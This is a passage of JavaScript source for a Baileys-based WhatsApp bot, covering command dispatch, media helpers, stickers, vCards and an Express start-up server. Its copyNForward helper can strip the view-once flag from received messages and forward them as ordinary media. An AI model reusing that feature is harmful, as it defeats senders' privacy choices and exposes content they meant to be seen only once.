  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
  } catch (e) {
  console.error("[PLUGIN ERROR] " + e);
  }
  }
  }
  events.commands.map(async(command) => {
  if (body && command.on === "body") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (mek.q && command.on === "text") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  (command.on === "image" || command.on === "photo") &&
  mek.type === "imageMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  command.on === "sticker" &&
  mek.type === "stickerMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  }});
  
  });
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo ? {
              contextInfo: {
                  ...content[ctype].contextInfo,
                  ...options.contextInfo
              }
          } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
          // save to file
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
    
      return buffer
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} message
    * @param {*} forceForward
    * @param {*} options
    * @returns
    */
    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                  let mime = '';
                  let res = await axios.head(url)
                  mime = res.headers['content-type']
                  if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
                  }
                  let type = mime.split("/")[0] + "Message"
                  if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
                  }
                }
    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      //let copy = message.toJSON()
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
          ...content,
          ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id
    
      return proto.WebMessageInfo.fromObject(copy)
    }
    
    
    /**
    *
    * @param {*} path
    * @returns
    */
    //=====================================================
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
      let type = await FileType.fromBuffer(data) || {
          mime: 'application/octet-stream',
          ext: '.bin'
      }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return {
          res,
          filename,
          size: await getSizeMedia(data),
          ...type,
          data
      }
    
    }
    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    /**
    *
    * @param {*} message
    * @param {*} filename
    * @param {*} attachExtension
    * @returns
    */
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} caption
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
          //========================================================================================================================================
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
  
  app.get("/", (req, res) => {
  res.send("GARFIELD-WHATSAPP-BOT-v10 STARTED ✅");
  });
  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
  setTimeout(() => {
  connectToWA()
  }, 4000);
